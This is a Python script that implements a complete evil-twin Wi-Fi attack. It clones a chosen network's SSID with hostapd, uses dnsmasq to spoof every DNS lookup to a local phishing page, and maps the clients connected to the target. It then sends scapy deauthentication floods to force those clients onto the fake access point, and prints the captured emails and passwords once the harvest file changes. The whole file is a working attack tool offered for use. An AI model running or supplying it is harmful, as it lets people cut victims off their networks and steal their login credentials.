# Sergey Arenzon

import ifcfg
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from wifi import Cell
from scapy.all import *
import yaml

#Shows available devices
def chooseDevice():
    devicesName = []
    for index,[_, interface] in enumerate(ifcfg.interfaces().items()):
        devicesName.append(str(index+1) + '.' + interface['device'])
    [print(x) for x in devicesName]
    choice = int(input())
    return devicesName[choice - 1].split('.')[1]

#print the AP (SSID, MAC, Signal)
def printAP(interface):
    devices = []
    print('\033[91m' + "   SSID             ADDRESS              SIGNAL")
    for count, ap in enumerate(Cell.all(interface)):
        devices.append(ap)
        ap_ssid = ap.ssid[:15]
        if len(ap_ssid) < 15:
            ap_ssid += ' ' * (15 - len(ap_ssid))
        ap_address = ap.address #size 17
        print('\033[94m' + str(count +1) + '. ' + '\033[94m' + ap_ssid + "  " + ap.address+"    " + str(ap.signal))
    return devices

# Make device to monitor mode
def goMonitorMode(attDevice):
    os.system("sudo -S ifconfig " + attDevice + " down")
    os.system("sudo -S iwconfig " + attDevice + " mode monitor")
    os.system("sudo -S ifconfig " + attDevice + " up")
    print(attDevice + " is now in monitor mode!")

#Checking option permission
def checkFotRoot():
    if not os.geteuid() == 0:
        sys.exit("\nOnly root can run this script\n")

def apRescanHandler(interface):
    print("===========\nScanned APs\n===========")
    devices = (list(printAP(interface))) # print all AP the device sens
    attSsid = input("Choose your attack AP or \"R\" fore rescan: ") # select AP to attack
    while attSsid == "R" or attSsid == "r": # if R selected repet scan for AP
        devices = (list(printAP(interface)))
        attSsid = input("Choose your attack AP or \"R\" fore rescan: ")
    return [devices[int(attSsid) - 1].ssid, devices[int(attSsid) - 1].address] # extract SSID and MAC

def startAP(ssid, interface):
    # Remove and create dnsmasq.conf
    os.remove("dnsmasq.conf")
    os.remove("hostapd.conf")
    with open("dnsmasq.conf", "a") as dnsfile:
        dnsfile.write("interface=" + interface + "\n" \
                "dhcp-range=10.0.0.10,10.0.0.100,8h\n" \
                "dhcp-option=3,10.0.0.1\n" \
                "dhcp-option=6,10.0.0.1\n" \
                "address=/#/10.0.0.1")

    with open("hostapd.conf", "a") as hostfile:
        hostfile.write("interface=" + interface + "\nssid=" + ssid + "\nchannel=2\ndriver=nl80211")

    os.system("sudo bash fake-ap-start.sh")
    # dhcp server provides ip to connected devices
    # dnsmasq runs dns server, and let us redirect to our web page
    # dnsmasq conf file:
    # interface=
    # dhcp-range=10.0.0.10, 10.0.0.100, 8h  (sets the IP range given to connected clients)
    # dhcp-option=3,10.0.0.1                (sets the gateway IP address, redirect the client to localhost server
    #                                       3=default gateway
    #                                       10.0.0.1=localhost IP server)
    # dhcp-option=6, 10.0.0.1               (dns server)
    #                                       6=set dns server
    # adress=/#/10.0.0.1                    (dns spoofing, every url will lead to localhost server)



def stopAttack():
    print("Stopping attack..")
    os.system("sudo bash fake-ap-stop.sh")
    with open("/var/www/html/passwords.txt",'r') as file:
        print("======================\nEmails and Passwords\n======================")
        print(file.read())

#this function send deaututh to the MAC that we attck
def deauth(interface, deviceadrr, addr):
    print("Sending deauth packets")
    pkt = RadioTap() / Dot11(addr1 = deviceadrr, addr2 = addr, addr3 = addr) / Dot11Deauth()
    sendp(pkt, iface=interface, count=100, inter=.001)

class AP:
    def __init__(self, ssid):
        self.ssid = ssid
        self.connectedDevices = []

    def addDevice(self, device):
        self.connectedDevices.append(device)

class Device:
    def __init__(self, bssid, signal, vendor):
        self.bssid = bssid
        self.signal = signal
        self.vendor = vendor

def parse_wifi_map(myssid,map_path):
    with open(map_path, 'r') as f:
        data = f.read()
    wifi_map = yaml.load(data)
    bssids = []
    ap = AP(myssid)
    for ssid in wifi_map:
        if ssid == myssid:
            print('ssid = {}'.format(ssid))
            ssid_node = wifi_map[ssid]
            for bssid in ssid_node:
                print('\tbssid = {}'.format(bssid))
                bssid_node = ssid_node[bssid]
                if 'devices' in bssid_node:
                    for device in bssid_node['devices']:
                        ap.addDevice(device)

    print("===============================\nDevices connected to " + myssid + "\n===============================")
    print("Connected devices list:\n")
    for t,dev in enumerate(ap.connectedDevices):
        print(str(t+1) +'.',dev)
    return ap.connectedDevices


#this function use our NIC to scann all the MAC the conctung to the ssid that we want to attck
def printDevices(ssid, interface):
    print("Search for devices in AP")
    if os.path.exists("wifi_map.yaml") is False:
        os.system('sudo trackerjacker -i ' + interface + ' --map')
    result = parse_wifi_map(ssid, 'wifi_map.yaml')

    return result

#get all the device that conncting to the SSID and allow to choose the MAC that we want to disconncte
def chooseAttDevice(ap_list):
    deviceNum = int(input("Choose for device for attack or \"R\" for rescan: ")) - 1
    if(deviceNum == len(ap_list)):
        return Device("ff:ff:ff:ff:ff:ff" , 0, "Broadcast")
    else:
        return ap_list[deviceNum]

#return the lest time passwords.txt file is modify
def checkPasswordsmodify():
    return os.path.getmtime("/var/www/html/passwords.txt")

if __name__ == "__main__":
    #intilaize
    lastmodify = checkPasswordsmodify()#the time of paasword file is modify
    checkFotRoot() # check for root
    #choose the ssid that you whant to attck and init the dnsmasq to make a fake ap with the same ssid
    print("Choose device for AP scan:")
    apDevice = chooseDevice() # choose device from connected interface
    [ssid,addr] = apRescanHandler(apDevice) # extract selected SSID and MAC addr
    startAP(ssid, apDevice) # remove and create dnsmaq.conf file

    #use the NIC to start the attck on the choosing device
    print("\nChoose interface for Mac scanning")
    interface = chooseDevice()
    mac_list = printDevices(ssid, interface)
    x = chooseAttDevice(mac_list)

   #this part check if we can finish the attck
    print("\nChoose interface for deauth attack")
    interface = chooseDevice()
    goMonitorMode(interface)
    while (lastmodify == checkPasswordsmodify()):
        deauth(interface,x, addr)
    stopAttack()
